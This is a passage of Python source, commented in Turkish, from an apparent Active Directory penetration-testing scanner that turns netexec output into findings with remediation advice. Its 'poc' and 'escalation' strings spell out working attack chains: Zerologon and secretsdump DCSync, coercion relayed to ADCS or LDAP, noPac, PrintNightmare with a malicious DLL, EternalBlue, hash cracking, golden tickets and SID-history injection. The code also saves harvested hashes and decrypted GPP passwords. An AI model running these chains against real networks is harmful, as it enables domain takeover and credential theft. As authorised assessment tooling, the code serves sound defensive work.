                description="DC makine hesabı parolası sıfırlanarak tüm domain ele geçirilebilir.",
                evidence=zl_line,
                remediation="Aralık 2020 ve sonrası güncellemeleri uygulayın; enforcement modunu açın.",
                reference="CVE-2020-1472 / Zerologon",
                poc=f"nxc smb {target} -M zerologon",
                escalation="(LAB) zerologon exploit ile DC makine parolasını sıfırla -> "
                f"'secretsdump.py -no-pass <domain>/<DC$>@{target}' -> DCSync (DA).",
            )
        )

    # Coercion (coerce_plus: PetitPotam/DFSCoerce/ShadowCoerce/Printerbug/MS-EVEN).
    # FP guard: coerce_plus DENEDİĞİ yöntemleri de yazar ("Trying PetitPotam…");
    # çıplak yöntem adına DEĞİL, yalnızca OLUMLU ve olumsuzlanmamış bir sinyale
    # (exploit success / "vulnerable") güven. Aksi halde yamalı DC "zorlama
    # mümkün" diye raporlanır.
    _coerce_subj = (r"petitpotam|dfscoerce|shadowcoerce|printerbug|ms-?even|"
                    r"efsr|dfsnm|coerc")
    coerce_line = _pos_vuln(combined, _coerce_subj, signal_rx=r"exploit success|vulnerable")
    if coerce_line:
        methods = ", ".join(sorted({m.lower() for m in re.findall(
            r"petitpotam|dfscoerce|shadowcoerce|printerbug|ms-?even", combined, re.IGNORECASE)}))
        # "Exploit Success, <rpc>" = DC FİİLEN zorlandı (onaylı). Olumsuz satırları
        # saymamak için burada da olumsuzlama-duyarlı kontrolü kullan.
        confirmed = _pos_vuln(combined, _coerce_subj, signal_rx=r"exploit success") is not None
        status = "ONAYLANDI (exploit success)" if confirmed else "mümkün"
        report.add(
            Finding(
                title=f"Kimlik doğrulama zorlaması {status}"
                      + (f" [{methods}]" if methods else ""),
                # Fiilen zorlanabiliyorsa relay ile DA neredeyse kesin -> CRITICAL
                severity=Severity.CRITICAL if confirmed else Severity.HIGH,
                target=target,
                source="nxc-vulns",
                description="DC/host saldırgana kimlik doğrulamaya zorlanabiliyor (coerce_plus)"
                            + (" ve zorlama FİİLEN BAŞARILI oldu" if confirmed else "")
                            + ". Yakalanan MAKİNE hesabı auth'u ADCS'ye (ESC8) ya da LDAP'a "
                            "relay edilerek domain ele geçirilebilir.",
                evidence=_grep(combined, r"VULNERABLE|Exploit Success|petitpotam|dfscoerce|"
                                         r"shadowcoerce|printerbug|ms-?even", context=0, limit=30),
                remediation="İlgili yamaları uygulayın; EPA + LDAP/SMB signing + ADCS "
                            "sertleştirmesi; gereksiz RPC (MS-EFSR/MS-DFSNM/MS-EVEN/spooler) kapatın.",
                reference="Coercion: PetitPotam/DFSCoerce/ShadowCoerce/PrinterBug/MS-EVEN (coerce_plus)",
                poc=(
                    "# OTOMATİK (adscan dinleyiciyi başlatır, DC'yi zorlar, relay eder):\n"
                    f"adscan {target} --active-attacks --launch --listener-ip <SIZIN_IP> "
                    "-d <domain> -u <user> -p <pass> "
                    "--adcs-ca-url http://<CA>/certsrv/certfnsh.asp\n"
                    "# --- MANUEL ---\n"
                    "# A) ESC8 (ADCS varsa):\n"
                    "#   1) ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support "
                    "--adcs --template DomainController\n"
                    f"#   2) nxc smb {target} -u <user> -p <pass> -M coerce_plus "
                    "-o LISTENER=<SIZIN_IP> METHOD=All\n"
                    f"#   3) certipy-ad auth -pfx 'DC01$.pfx' -dc-ip {target}  ->  "
                    f"secretsdump.py <domain>/'DC01$'@{target} -just-dc\n"
                    "# B) LDAP relay -> RBCD (ADCS yoksa; LDAP signing/CB kapalıysa):\n"
                    f"#   1) ntlmrelayx.py -t ldap://{target} --remove-mic "
                    "--delegate-access --no-dump --no-da --no-acl\n"
                    f"#   2) nxc smb {target} -u <user> -p <pass> -M coerce_plus "
                    "-o LISTENER=<SIZIN_IP> METHOD=All"),
                escalation=(
                    "Zorlanan MAKİNE hesabı (ör. DC01$) auth'unu relay et — iki yol:\n"
                    "A) ESC8 (ADCS web enrollment varsa) = en temiz DA:\n"
                    "   1. ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n"
                    f"   2. nxc smb {target} -u <user> -p <pass> -M coerce_plus -o LISTENER=<SIZIN_IP> METHOD=All\n"
                    "   3. certipy-ad auth -pfx 'DC01$.pfx' -dc-ip " + target + "   (TGT/NT hash)\n"
                    f"   4. secretsdump.py <domain>/'DC01$'@{target} -just-dc   -> krbtgt = DA\n"
                    "B) LDAP relay -> RBCD (ADCS yoksa, LDAP signing/CB kapalıysa):\n"
                    f"   1. ntlmrelayx.py -t ldap://{target} --remove-mic --delegate-access --escalate-user <makine$>\n"
                    "   2. getST.py -spn cifs/DC01.<domain> -impersonate Administrator <domain>/<makine$>:<pass>\n"
                    "NOT: hedef SMB signing:True -> SMB-relay DC'ye ÇALIŞMAZ; ESC8 (HTTP) ya da LDAP kullan."),
            )
        )

    # pre2k — pre-created makine hesapları (parola başta = hesap adı, küçük harf).
    # FP guard: "No pre-created computer accounts found" OLUMSUZ satırındaki
    # "found"/"pre-created"e takılma; yalnızca OLUMLU sinyalde raporla
    # (olumsuzlanmamış "vulnerable" / "GOT TGT" başarı satırı).
    pre2k_line = _pos_vuln(combined, r"pre2k|pre-?created",
                           signal_rx=r"vulnerable|got tgt|succeeded")
    if not pre2k_line:
        pre2k_line = _grep(combined, r"GOT TGT", context=0).strip() or None
    if pre2k_line:
        ev = _grep(combined, r"pre2k|pre-created|GOT TGT|\$", context=0, limit=20) or pre2k_line
        if ev.strip():
            report.add(
                Finding(
                    title="Pre-Windows 2000 makine hesabı/hesapları (tahmin edilebilir parola)",
                    severity=Severity.HIGH,
                    target=target,
                    source="nxc-vulns",
                    description="Pre-created makine hesaplarının başlangıç parolası, hesap adının "
                                "küçük harfli halidir; bir foothold kimliği sağlar.",
                    evidence=ev,
                    remediation="Kullanılmayan pre-created hesapları silin; oluştururken güçlü "
                                "rastgele parola atayın.",
                    reference="pre2k (pre-created computer accounts)",
                    poc=f"nxc ldap {target} -u <user> -p <pass> -M pre2k",
                    escalation="Elde edilen makine hesabı kimliğiyle LDAP/SMB enum + kerberoast; "
                               "RBCD/ADCS zincirine foothold olarak beslenir.",
                )
            )

    # MachineAccountQuota — düşük yetkili kullanıcı kaç makine hesabı ekleyebilir?
    m = re.search(r"MachineAccountQuota:\s*(\d+)", combined, re.IGNORECASE)
    if m and int(m.group(1)) > 0:
        maq = int(m.group(1))
        report.add(
            Finding(
                title=f"MachineAccountQuota = {maq} (RBCD/makine hesabı suistimali)",
                severity=Severity.MEDIUM,
                target=target,
                source="nxc-vulns",
                description="Varsayılan 10; sıfırdan büyük değerler RBCD ve noPac gibi saldırılara zemin hazırlar.",
                evidence=_grep(combined, r"MachineAccountQuota", context=0),
                remediation="ms-DS-MachineAccountQuota değerini 0 yapıp ekleme yetkisini delege edin.",
                reference="MachineAccountQuota / RBCD",
                poc=f"nxc ldap {target} -u <user> -p <pass> -M maq",
                escalation="RBCD: yeni makine hesabı oluştur (addcomputer.py) -> hedefte "
                "msDS-AllowedToActOnBehalfOfOtherIdentity ayarla -> S4U2proxy ile admin "
                "taklidi. noPac (CVE-2021-42278/42287) da olası.",
            )
        )

    _parse_timeroast(combined, report)
    _parse_nopac(combined, report)
    _parse_trusts(combined, report)
    _parse_printnightmare(combined, report)
    _parse_smbghost(combined, report)
    _parse_sccm(combined, report)
    _parse_ms17_010_nxc(combined, report)   # EternalBlue (nmap'ten bağımsız teyit)
    _parse_gpp_password(results, report)    # GPP cpassword (MS14-025) -> kimlik


# ---------------------------------------------------------------------------
# Yeni kapsam (C): timeroast / noPac / domain-forest trust'ları
# ---------------------------------------------------------------------------

def _parse_timeroast(combined: str, report: ScanReport) -> None:
    """Timeroasting: kimliksiz, RID tabanlı NTP ile makine hesabı hash'i.

    netexec `-M timeroast` kırılabilir hash'leri `$sntp-ms$...` biçiminde verir.
    FP guard: yalnızca gerçek hash satırı varsa raporla (banner/olumsuz değil).
    """
    target = report.target
    hashes = re.findall(r"\$sntp-ms\$\S+", combined)
    if not hashes:
        return
    # Kırma fazı için loot/timeroast.txt'e "RID:$sntp-ms$..." biçiminde yaz
    # (crack.py hashcat -m 31300 ile --username bayrağı kullanarak kırar).
    rid_lines = re.findall(r"(\d+):(\$sntp-ms\$\S+)", combined)
    try:
        import os as _os
        tpath = _loot_path(report.outdir, "timeroast.txt")
        _os.makedirs(_os.path.dirname(tpath), exist_ok=True)
        with open(tpath, "w", encoding="utf-8") as _fh:
            if rid_lines:
                _fh.write("\n".join(f"{rid}:{h}" for rid, h in rid_lines) + "\n")
            else:
                _fh.write("\n".join(hashes) + "\n")
    except OSError:
        pass
    report.add(Finding(
        title=f"Timeroasting: {len(hashes)} makine hesabı hash'i toplandı — nxc",
        severity=Severity.HIGH, target=target, source="nxc-vulns",
        description="Kimlik gerektirmeden (NTP/MS-SNTP) makine hesaplarının parola "
                    "hash'leri toplandı; çevrimdışı kırılabilir.",
        evidence=_grep(combined, r"\$sntp-ms\$|timeroast", context=0, limit=20),
        remediation="DC'de MS-SNTP imzalama davranışını denetleyin; zayıf makine "
                    "hesabı parolalarını (eski/manuel) güçlendirin.",
        reference="Timeroasting (MS-SNTP)", mitre="T1558",
        poc=f"nxc smb {target} -M timeroast",
        escalation="Hash'i çevrimdışı kır: 'hashcat -m 31300 time.hash rockyou.txt'. "
                   "Kırılan makine hesabı -> RBCD/ADCS zincirine foothold kimliği."))


def _parse_nopac(combined: str, report: ScanReport) -> None:
    """noPac (CVE-2021-42278/42287): sAMAccountName spoofing ile DA.

    FP guard: aracın denemesini/banner'ını değil, yalnızca olumsuzlanmamış
    pozitif sinyali (vulnerable / got tgt) say.
    """
    target = report.target
    line = _pos_vuln(combined, r"nopac|sam.?the.?admin|42278|42287",
                     signal_rx=r"vulnerable|got tgt|exploitable|succeeded")
    if not line:
        return
    report.add(Finding(
        title="noPac (CVE-2021-42278/42287) ZAFİYETLİ",
        severity=Severity.CRITICAL, target=target, source="nxc-vulns",
        description="sAMAccountName spoofing + S4U ile düşük yetkili kullanıcı DC'de "
                    "yönetici taklidi yapabilir (MachineAccountQuota>0 ise foothold'dan DA).",
        evidence=line,
        remediation="KB5008102/KB5008380/KB5008602 yamalarını uygulayın; "
                    "ms-DS-MachineAccountQuota=0 yapın.",
        reference="CVE-2021-42278 / CVE-2021-42287 (noPac/sAMAccountName spoofing)",
        mitre="T1068",
        poc=f"nxc smb {target} -u <user> -p <pass> -M nopac",
        escalation="(LAB) noPac.py <domain>/<user>:<pass> -dc-ip <dc> -dc-host <DC> "
                   "--impersonate administrator -shell  -> SYSTEM/DCSync -> DA."))


def _parse_printnightmare(combined: str, report: ScanReport) -> None:
    """PrintNightmare (CVE-2021-1675/34527): Spooler RCE. FP guard: _pos_vuln."""
    line = _pos_vuln(combined, r"printnightmare|1675|34527|print.?spool",
                     signal_rx=r"vulnerable|exploitable|likely")
    if not line:
        return
    report.add(Finding(
        title="PrintNightmare (CVE-2021-1675/34527) ZAFİYETLİ", severity=Severity.CRITICAL,
        target=report.target, source="nxc-vulns",
        description="Print Spooler uzaktan kod çalıştırmaya açık; kimlikli bir kullanıcı "
                    "DC/host üzerinde SYSTEM elde edebilir (DC ise domain ele geçirme).",
        evidence=line,
        remediation="Güncel Spooler yamalarını uygulayın; gereksizse Spooler'ı kapatın; "
                    "'Point and Print' kısıtlamalarını zorunlu kılın.",
        reference="CVE-2021-1675 / CVE-2021-34527 (PrintNightmare)", mitre="T1068",
        poc=f"nxc smb {report.target} -u <user> -p <pass> -M printnightmare",
        escalation="(LAB) CVE-2021-1675.py <domain>/<user>:<pass>@<dc> '\\\\<ip>\\share\\evil.dll' "
                   "-> SYSTEM -> DCSync/DA."))


def _parse_smbghost(combined: str, report: ScanReport) -> None:
    """SMBGhost (CVE-2020-0796): SMBv3.1.1 compression RCE. FP guard: _pos_vuln."""
    line = _pos_vuln(combined, r"smbghost|0796|smbv?3.*compress",
                     signal_rx=r"vulnerable|exploitable|likely")
    if not line:
        return
    report.add(Finding(
        title="SMBGhost (CVE-2020-0796) ZAFİYETLİ", severity=Severity.CRITICAL,
        target=report.target, source="nxc-vulns",
        description="SMBv3.1.1 sıkıştırma başlığı işlemedeki tamsayı taşması ile uzaktan "
                    "(kimliksiz) kod çalıştırma / yerel yetki yükseltme mümkün.",
        evidence=line,
        remediation="KB4551762 yamasını uygulayın; geçici olarak SMBv3 sıkıştırmayı kapatın.",
        reference="CVE-2020-0796 (SMBGhost/CoronaBlue)", mitre="T1210",
        poc=f"nxc smb {report.target} -M smbghost",
        escalation="(LAB) genel SMBGhost RCE PoC'si -> SYSTEM shell -> secretsdump -> yanal hareket."))


def _parse_ms17_010_nxc(combined: str, report: ScanReport) -> None:
    """MS17-010 (EternalBlue) — netexec -M ms17-010 ile bağımsız teyit.

    nmap modülü de ayrı bir bulgu üretebilir; farklı kaynaklar (nmap/nxc) aynı
    fingerprint'i paylaşmadığından ScanReport.add bunları ayrı tutar — çift
    kaynak teyidi savunan için değerlidir. FP guard: _pos_vuln olumsuzlamayı eler.
    """
    line = _pos_vuln(combined, r"ms17-010|eternalblue", signal_rx=r"vulnerable")
    if not line:
        return
    report.add(Finding(
        title="MS17-010 (EternalBlue) ZAFİYETLİ — nxc",
        severity=Severity.CRITICAL, target=report.target, source="nxc-vulns",
        description="netexec, SMBv1'de MS17-010 (EternalBlue) uzaktan kod çalıştırma "
                    "zafiyetini doğruladı — kimliksiz RCE.",
        evidence=line,
        remediation="MS17-010 güvenlik güncellemesini derhal uygulayın; SMBv1'i kapatın.",
        reference="CVE-2017-0143 / MS17-010", mitre="T1210",
        poc=f"nxc smb {report.target} -M ms17-010",
        escalation="RCE (yalnızca LAB): AutoBlue/metasploit "
                   "'exploit/windows/smb/ms17_010_eternalblue' -> SYSTEM -> secretsdump -> DA."))


def _parse_gpp_password(results: list[CommandResult], report: ScanReport) -> None:
    """GPP cpassword (MS14-025 / CVE-2014-1812): SYSVOL Groups.xml çözülmüş parola.

    GPP cpassword'ü şifreleyen AES anahtarı Microsoft tarafından yayımlandığından
    netexec `-M gpp_password` değeri otomatik ÇÖZER. Bulunan her kimlik rapora
    eklenir. FP guard: olumsuz/banner satırları ve boş/placeholder değerler elenir.
    """
    out = strip_dryrun(next(
        (r.combined for r in results if r.tool.endswith("gpp-password")), ""))
    if not out or not re.search(r"pass(?:word)?s?\s*[:=]", out, re.IGNORECASE):
        return

    def _clean(tok: str) -> str:
        return tok.strip().strip("[]'\" ").strip()

    placeholders = {"none", "null", "not found", "[not found]", "empty", ""}
    users = [_clean(u) for u in re.findall(
        r"user(?:name)?s?\s*[:=]\s*([^\n]+)", out, re.IGNORECASE)]
    pws = [_clean(p) for p in re.findall(
        r"pass(?:word)?s?\s*[:=]\s*([^\n]+)", out, re.IGNORECASE)]
    users = [u for u in users if u.lower() not in placeholders]
    pws = [p for p in pws if p.lower() not in placeholders]
    if not pws:
        return

    if len(users) == len(pws):
        pairs = list(zip(users, pws, strict=True))
    else:  # kullanıcı eşleşmese de çözülen parolaları kaybetme
        pairs = [(users[i] if i < len(users) else "", p) for i, p in enumerate(pws)]

    for u, p in pairs:
        report.add_credential(Credential(
            username=u or "(gpp)", secret=p, kind="password",
            domain=report.domain or "", source="gpp-password"))
    ev = "\n".join(f"{u or '?'}:{'<gizli>' if config.REDACT else p}" for u, p in pairs[:25])
    report.add(Finding(
        title=f"GPP cpassword kimlik(leri) ({len(pairs)}) — SYSVOL Groups.xml (MS14-025)",
        severity=Severity.CRITICAL, target=report.target, source="nxc-vulns",
        description="SYSVOL'deki Group Policy Preferences (Groups.xml / Services.xml / "
                    "ScheduledTasks.xml) dosyalarında 'cpassword' alanı bulundu. Şifreleme "
                    "anahtarı herkese açık olduğundan parola geri çözülür; tüm kimlikli "
                    "kullanıcılarca okunabilen, doğrudan kullanılabilir bir kimliktir.",
        evidence=ev,
        remediation="GPP cpassword içeren XML'leri SYSVOL'den kaldırın (MS14-025 yaması bunu "
                    "engeller); sızan hesapların parolalarını döndürün.",
        reference="CVE-2014-1812 / MS14-025 (GPP cpassword)", mitre="T1552.006",
        poc=f"nxc smb {report.target} -u <user> -p <pass> -M gpp_password",
        escalation=f"Çözülen kimliği doğrudan dene: 'adscan {report.target} --reuse "
                   "-u <user> -p <parola>' -> yanal hareket / privesc."))


def _parse_sccm(combined: str, report: ScanReport) -> None:
    """SCCM/MECM keşfi (-M sccm): site sunucuları / NAA kimlik ipuçları.

    FP guard: banner/olumsuz satırları ele; yalnızca gerçek SCCM veri satırı.
    """
    rows = []
    for ln in combined.splitlines():
        low = ln.lower()
        if "sccm" not in low and "mecm" not in low and "mp " not in low \
                and "management point" not in low and "naa" not in low:
            continue
        if _is_negative_line(ln) or not re.search(r"->|\.\w|:\s*\S|found|site\s*code|server",
                                                  low):
            continue
        rows.append(ln.strip())
    if not rows:
        return
    report.add(Finding(
        title=f"SCCM/MECM altyapısı tespit edildi ({len(rows)}) — nxc", severity=Severity.MEDIUM,
        target=report.target, source="nxc-vulns",
        description="Ortamda SCCM/MECM (Configuration Manager) bulundu. SCCM, Network Access "
                    "Account (NAA) kimlikleri, PXE boot medyası ve site takeover üzerinden "
                    "yaygın bir yetki yükseltme/ele geçirme yüzeyidir.",
        evidence="\n".join(rows[:25]),
        remediation="NAA kullanımını kaldırın (Enhanced HTTP/PKI'ye geçin); PXE parolası + imza; "
                    "SCCM site sunucularını tiered admin modeline alın.",
        reference="SCCM/MECM Attacks (NAA/PXE/Site Takeover)", mitre="T1078",
        poc=f"nxc ldap {report.target} -u <user> -p <pass> -M sccm",
        escalation="SharpSCCM/sccmhunter ile NAA kimliklerini çek (PXE/policy) -> yanal hareket; "
                   "site takeover ile client'lara politika it."))


def _parse_trusts(combined: str, report: ScanReport) -> None:
    """Domain/forest trust'ları: cross-domain/forest saldırı yüzeyi.

    FP guard: banner/olumsuz ("No trusts found") satırlarını ele; yalnızca gerçek
    trust satırı (yön/tür içeren) varsa raporla.
    """
    target = report.target
    rows = []
    for ln in combined.splitlines():
        if _is_negative_line(ln):
            continue
        # Gerçek trust satırı: bir yön/tür belirteci VAR ve bir domain referansı
        # (nokta içeren ad / "->" / NetBIOS "\") içerir — banner "[+] enum_trusts"
        # tek başına eşleşmesin.
        if re.search(r"bidirection|inbound|outbound|parent.?child|tree.?root|"
                     r"external|forest.?trans|cross.?forest", ln, re.IGNORECASE) \
                and re.search(r"->|\.\w|\\", ln):
            rows.append(ln.strip())
    if not rows:
        return
    report.add(Finding(
        title=f"Domain/forest trust ilişkileri bulundu ({len(rows)}) — nxc",
        severity=Severity.MEDIUM, target=target, source="nxc-vulns",
        description="Trust ilişkileri, bir domaindeki ele geçirmenin başka "
                    "domain/forest'e taşınmasına (SID history, foreign group, "
                    "cross-forest Kerberos) olanak verebilir.",
        evidence="\n".join(rows[:25]),
        remediation="Gereksiz trust'ları kaldırın; SID filtering (quarantine) uygulayın; "
                    "selective authentication kullanın.",
        reference="Domain/Forest Trusts", mitre="T1482",
        poc=f"nxc ldap {target} -u <user> -p <pass> -M enum_trusts",
        escalation="Trust yönünü incele: güvenen tarafta DA isen trusted forest'a "
                   "cross-forest TGT/golden ticket; SID history enjeksiyonu (patch'siz "
                   "SID filtering) ile Enterprise Admins taklidi."))


# ---------------------------------------------------------------------------
# Registry adaptörleri + kayıtları
# ---------------------------------------------------------------------------

from ..registry import ScanContext, ScanModule  # noqa: E402


def _smb_run(ctx: ScanContext) -> list[CommandResult]:
    return smb_scan(ctx.target, username=ctx.username, password=ctx.password,
                    nthash=ctx.nthash, domain=ctx.domain,
                    timeout=ctx.timeout, dry_run=ctx.dry_run,
                    use_kerberos=ctx.use_kerberos, full=ctx.full)


def _ldap_run(ctx: ScanContext) -> list[CommandResult]:
    return ldap_scan(ctx.target, username=ctx.username, password=ctx.password,
                     nthash=ctx.nthash, domain=ctx.domain,
                     timeout=ctx.timeout, dry_run=ctx.dry_run,
                     outdir=ctx.outdir, use_kerberos=ctx.use_kerberos)


def _vuln_run(ctx: ScanContext) -> list[CommandResult]:
    return vuln_scan(ctx.target, username=ctx.username, password=ctx.password,
                     nthash=ctx.nthash, domain=ctx.domain,
                     timeout=ctx.timeout, dry_run=ctx.dry_run,
                     use_kerberos=ctx.use_kerberos)


SMB_MODULE = ScanModule(
    name="nxc-smb",
    label="netexec SMB enumerasyonu",
    run=_smb_run,
    parse=parse_smb,
)

LDAP_MODULE = ScanModule(
    name="nxc-ldap",
    label="netexec LDAP enumerasyonu",
    run=_ldap_run,
    parse=parse_ldap,
)

VULN_MODULE = ScanModule(
    name="nxc-vulns",
    label="netexec aktif zafiyet kontrolleri (zerologon/coerce_plus/maq/pre2k/"
          "ms17-010/gpp_password/printnightmare/smbghost/sccm)",
    run=_vuln_run,
    parse=parse_vuln,
)
